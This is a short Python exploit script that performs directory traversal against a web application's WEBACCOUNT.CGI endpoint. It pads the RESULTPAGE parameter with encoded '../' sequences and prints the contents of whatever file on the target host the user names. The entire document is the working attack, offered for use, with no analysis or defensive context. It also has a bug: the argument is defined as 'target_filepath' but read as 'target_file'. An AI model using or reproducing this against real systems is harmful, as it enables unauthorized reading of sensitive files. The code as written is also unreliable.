import requests
import argparse

def perform_traversal(ip, port, target_file):
    base_path = 'WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F'
    traversal_path = f'{base_path}{target_file}'
    
    url = f'http://{ip}:{port}/'

    
    response = requests.get(url, params=traversal_path)
    
    if response.status_code == 200:
        print("Please check the output!")
        print("Response Content:")
        print(response.text)
    else:
        print(f"Failed with status code: {response.status_code}")
        print("Response Content:")
        print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform directory traversal.")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("target_filepath", help="File path to access with directory traversal")
    
    args = parser.parse_args()
    
    perform_traversal(args.ip, args.port, args.target_file)
